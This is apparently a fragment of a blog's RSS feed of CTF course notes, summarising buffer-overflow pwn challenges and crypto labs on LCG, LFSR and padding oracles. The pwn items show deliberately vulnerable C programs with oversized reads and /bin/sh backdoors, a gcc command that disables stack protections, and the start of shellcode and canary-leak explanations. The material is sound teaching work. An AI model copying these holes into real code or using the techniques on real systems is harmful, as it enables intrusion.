&lt;/h6>
&lt;p>Follow the concept of lecture &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/SJAt7Pd5s">0x00&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

void y0u_c4n7_533_m3()
{
 execve(&amp;#34;/bin/sh&amp;#34;, (char *[]){0}, (char *[]){0});
}

int main()
{
 char buf[16];
 puts(&amp;#34;This is your first bof challenge ;)&amp;#34;);
 fflush(stdout);
 read(0, buf, 0x30);
 system(&amp;#34;pause&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow.
We can check &lt;code>bof&lt;/code> in the main function that it read the string with length &lt;code>0x30&lt;/code> that bigger than &lt;code>buf&lt;/code> size.&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x02</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/</guid><description>&lt;h1 id="simple-buffer-overflow---0x02">
 Simple Buffer Overflow - 0x02
 &lt;a class="anchor" href="#simple-buffer-overflow---0x02">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="why-wed-like-to-create-shellcode">
 Why we&amp;rsquo;d like to create shellcode?
 &lt;a class="anchor" href="#why-wed-like-to-create-shellcode">#&lt;/a>
&lt;/h2>
&lt;p>In pwn problem, most of the program don&amp;rsquo;t have the secret function that we can take the shell. Thus, we can create a shellcode by ourselves and use &lt;code>bof&lt;/code> to overlap the original address by shellcode address. Then we can take the shell.&lt;/p>
&lt;h2 id="how-to-create-a-shellcode-in-bof">
 How to create a shellcode in BOF?
 &lt;a class="anchor" href="#how-to-create-a-shellcode-in-bof">#&lt;/a>
&lt;/h2>
&lt;p>In lecture &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs">0x01&lt;/a>, we can see sub-function that create a shell using command:&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x04</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/</guid><description>&lt;h1 id="simple-buffer-overflow---0x04">
 Simple Buffer Overflow - 0x04
 &lt;a class="anchor" href="#simple-buffer-overflow---0x04">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

char message[48];

int main()
{
 char name[16];
 printf(&amp;#34;Give me your message: &amp;#34;);
 fflush(stdout);
 read(0, message, 0x30);
 fflush(stdout);
 read(0, name, 0x30);
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>Actually, this is a variant of the &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs">lecture 0x01&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;font color="F0000">Note that&lt;/font>, the global variable has its own address, instead of local variable that push to stack that we don&amp;rsquo;t know at first.&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x05(Leak Canary)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/</guid><description>&lt;h1 id="simple-buffer-overflow---0x05leak-canary">
 Simple Buffer Overflow - 0x05(Leak Canary)
 &lt;a class="anchor" href="#simple-buffer-overflow---0x05leak-canary">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="canary-background">
 Canary Background
 &lt;a class="anchor" href="#canary-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://imgur.com/onxC8Aq.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

void backdoor()
{
 system(&amp;#34;/bin/sh&amp;#34;);
}

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char name[0x10];
 char phone[0x10];

 printf(&amp;#34;What&amp;#39;s your name: &amp;#34;);
 read(0, name, 0x100);
 printf(&amp;#34;Hello, %s !&amp;#34;, name);

 printf(&amp;#34;What&amp;#39;s your phone number: &amp;#34;);
 read(0, phone, 0x100);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use &lt;code>checksec&lt;/code> to observe the protection
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o bof2_leak_canary bof2_leak_canary.c -zexecstack -no-pie -z norelro
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/u5iueTC.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>First, we can use &lt;code>objdump -d -M Intel {filename}&lt;/code> to check the address of backdoor → &lt;code>0x4011b6&lt;/code>
&lt;img src="https://imgur.com/d30qIvL.png" alt="" />&lt;/p></description></item><item><title>Simple Crypto - 0x01(Modular Operation)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/</guid><description>&lt;h1 id="simple-crypto---0x01modular-operation">
 Simple Crypto - 0x01(Modular Operation)
 &lt;a class="anchor" href="#simple-crypto---0x01modular-operation">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-crypto-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-crypto-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10225768">『Day 23密碼卷宗現代篇非對稱章 - RSA&lt;/a>
&lt;a href="https://blog.csdn.net/lion19930924/article/details/61926019">模运算与逆元&lt;/a>
模運算基本特性:
$$
(a + b) % p = (a % p + b % p) % p \
(a - b) % p = (a % p - b % p) % p \
(a * b) % p = (a % p * b % p) % p \
(a ^ b) % p = ((a % p) ^ b ) % p
$$
模運算的结合律：
$$
((a + b) % p + c) % p= (a + (b + c) % p) % p \
((a * b) % p * c) % p = (a * (b * c) % p ) % p
$$
交換律：
$$
(a + b) % p = (b+a) % p \
(a * b) % p = (b * a) % p
$$
分配率：
$$
((a +b) % p * c) % p = ((a * c) % p + (b * c) % p) % p
$$&lt;/p></description></item><item><title>Simple Crypto - 0x02(Random Number Generator - LCG)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/</guid><description>&lt;h1 id="simple-crypto---0x02random-number-generator---lcg">
 Simple Crypto - 0x02(Random Number Generator - LCG)
 &lt;a class="anchor" href="#simple-crypto---0x02random-number-generator---lcg">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-crypto-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-crypto-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Linear Congruential Generator:
&lt;img src="https://i.imgur.com/pCTWEcO.png" alt="" />&lt;/p>
&lt;h2 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h2>
&lt;p>LCG Formula
$$
\begin{aligned}
Unknown: S_0&amp;amp;=Seed,\ A,\ B,\ m = 2^{32} \
Given: S_1&amp;amp;,\ S_2,\ S_3\
S_1 &amp;amp;\equiv (AS_0\ +\ B)\ %\ m\
S_2 &amp;amp;\equiv (AS_1\ +\ B)\ %\ m\
S_3 &amp;amp;\equiv (AS_2\ +\ B)\ %\ m\
\end{aligned}
$$&lt;/p>
&lt;p>Derived A
$$
\begin{aligned}
&amp;amp;\left{
\begin{array}{c}
S_2 &amp;amp;\equiv (AS_1\ +\ B)\ %\ m\
S_3 &amp;amp;\equiv (AS_2\ +\ B)\ %\ m
\end{array}
\right.
\ \ \ \ \ \ minus \ two \ formula\ \
&amp;amp;\to (S_2-S_3) \equiv (AS_1\ +\ B)\ %\ m-(AS_2\ +\ B)\ %\ m \
&amp;amp;\to (S_2-S_3)\ % \ m\equiv [(AS_1\ +\ B)\ %\ m-(AS_2\ +\ B)\ %\ m]\ %\ m \
&amp;amp;\to (S_2-S_3)\ % \ m\equiv [(AS_1\ +\ B)-(AS_2\ +\ B)]\ %\ m \
&amp;amp;\to (S_2-S_3)\ % \ m\equiv \ A\ (S_1-S_2)\ \ %\ m =(S_2-S_3)\
A&amp;amp;=((S_2-S_3)(S_1-S_2)^{-1})\ %\ m
\end{aligned}
$$&lt;/p></description></item><item><title>Simple Crypto - 0x03(2023 Lab - COR)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/</guid><description>&lt;h1 id="simple-crypto---0x032023-lab---cor">
 Simple Crypto - 0x03(2023 Lab - COR)
 &lt;a class="anchor" href="#simple-crypto---0x032023-lab---cor">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rkiE18Kas">Simple Crypto - 0x03(Lab - LFSR)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> random
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">LFSR&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, tap, state):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_tap &lt;span style="color:#f92672">=&lt;/span> tap
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_state &lt;span style="color:#f92672">=&lt;/span> state
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getbit&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f &lt;span style="color:#f92672">=&lt;/span> sum([self&lt;span style="color:#f92672">.&lt;/span>_state[i] &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_tap]) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_state[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_state &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_state[&lt;span style="color:#ae81ff">1&lt;/span>:] &lt;span style="color:#f92672">+&lt;/span> [f]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> x
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">triLFSR&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, lfsr1, lfsr2, lfsr3):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lfsr1 &lt;span style="color:#f92672">=&lt;/span> lfsr1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lfsr2 &lt;span style="color:#f92672">=&lt;/span> lfsr2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lfsr3 &lt;span style="color:#f92672">=&lt;/span> lfsr3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getbit&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x1 &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lfsr1&lt;span style="color:#f92672">.&lt;/span>getbit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x2 &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lfsr2&lt;span style="color:#f92672">.&lt;/span>getbit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x3 &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lfsr3&lt;span style="color:#f92672">.&lt;/span>getbit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> x2 &lt;span style="color:#66d9ef">if&lt;/span> x1 &lt;span style="color:#66d9ef">else&lt;/span> x3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lfsr1 &lt;span style="color:#f92672">=&lt;/span> LFSR([&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>], [random&lt;span style="color:#f92672">.&lt;/span>randrange(&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">19&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lfsr2 &lt;span style="color:#f92672">=&lt;/span> LFSR([&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>], [random&lt;span style="color:#f92672">.&lt;/span>randrange(&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">23&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lfsr3 &lt;span style="color:#f92672">=&lt;/span> LFSR([&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>], [random&lt;span style="color:#f92672">.&lt;/span>randrange(&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">27&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> triLFSR(lfsr1, lfsr2, lfsr3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> map(int, &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join([&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{:08b}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(c) &lt;span style="color:#66d9ef">for&lt;/span> c &lt;span style="color:#f92672">in&lt;/span> FLAG]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>output &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">200&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output&lt;span style="color:#f92672">.&lt;/span>append(cipher&lt;span style="color:#f92672">.&lt;/span>getbit())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> flag:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output&lt;span style="color:#f92672">.&lt;/span>append(cipher&lt;span style="color:#f92672">.&lt;/span>getbit() &lt;span style="color:#f92672">^&lt;/span> b)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(output)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># [0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x03(Lab - LFSR)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/</guid><description>&lt;h1 id="simple-crypto---0x03lab---lfsr">
 Simple Crypto - 0x03(Lab - LFSR)
 &lt;a class="anchor" href="#simple-crypto---0x03lab---lfsr">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-eductf-ctf-crypto">
 tags: &lt;code>eductf&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-eductf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hnXtaiyvQ3s?t=945">[2022 fall] 0923 Crypto - LFSR&lt;/a>
&lt;a href="https://youtu.be/dYyNeMeDM20?t=4386">Crypto I - LFSR&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>Must read the source code first with some comment I added
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pytho=" data-lang="pytho=">import random

# from secret import FLAG

FLAG = b&amp;#39;00001111&amp;#39;

class LFSR:
 def __init__(self, tap, state):
 self._tap = tap
 self._state = state

 def getbit(self):
 # f is the new bit that append in last position
 f = sum([self._state[i] for i in self._tap]) &amp;amp; 1

 # x is the output bit
 x = self._state[0]
 
 # self._state is a new state
 self._state = self._state[1:] + [f]
 return x

class triLFSR:
 def __init__(self, lfsr1, lfsr2, lfsr3):
 self.lfsr1 = lfsr1
 self.lfsr2 = lfsr2
 self.lfsr3 = lfsr3

 def getbit(self):
 x1 = self.lfsr1.getbit()
 x2 = self.lfsr2.getbit()
 x3 = self.lfsr3.getbit()
 return x2 if x1 else x3
# These are the state of lfsr1, lfsr2, and lfsr3
A = [random.randrange(2) for _ in range(27)]
B = [random.randrange(2) for _ in range(23)]
C = [random.randrange(2) for _ in range(25)]
print(A, B, C)

# tap is a filter that decide the last bit is 1 or 0
tap1 = [0, 13, 16, 26]
tap2 = [0, 5, 7, 22]
tap3 = [0, 17, 19, 24]

lfsr1 = LFSR(tap1, A)
lfsr2 = LFSR(tap2, B)
lfsr3 = LFSR(tap3, C)
cipher = triLFSR(lfsr1, lfsr2, lfsr3)

# Transfer the flag to ascii code and expressed in binary
# e.g. FLAG = &amp;#39;00001111&amp;#39; → &amp;#39;3030303031313131&amp;#39; → &amp;#39;001100000011000000110000...00110001&amp;#39;(64 bits)
flag = map(int, &amp;#39;&amp;#39;.join([&amp;#34;{:08b}&amp;#34;.format(c) for c in FLAG]))

output = []

for b in flag:
 # print(b)
 output.append(cipher.getbit() ^ b)

for _ in range(200):
 output.append(cipher.getbit())

# print(output)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x04(2023 Lab - POA)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/</guid><description>&lt;h1 id="simple-crypto---0x042023-lab---poa">
 Simple Crypto - 0x04(2023 Lab - POA)
 &lt;a class="anchor" href="#simple-crypto---0x042023-lab---poa">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/dYyNeMeDM20?si=BEvBPBzCsg8oWv_Q&amp;amp;t=8317"> Crypto I - Timmy&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Cipher &lt;span style="color:#f92672">import&lt;/span> AES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">pad&lt;/span>(data, block_size):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">+=&lt;/span> bytes([&lt;span style="color:#ae81ff">0x80&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> [&lt;span style="color:#ae81ff">0x00&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> (&lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(data) &lt;span style="color:#f92672">%&lt;/span> block_size))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># padding style: &amp;lt;oooooo[0x80][0x00]...[0x00]&amp;gt; (find first [0x80])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">unpad&lt;/span>(data, block_size):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(data) &lt;span style="color:#f92672">%&lt;/span> block_size:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> padding_len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
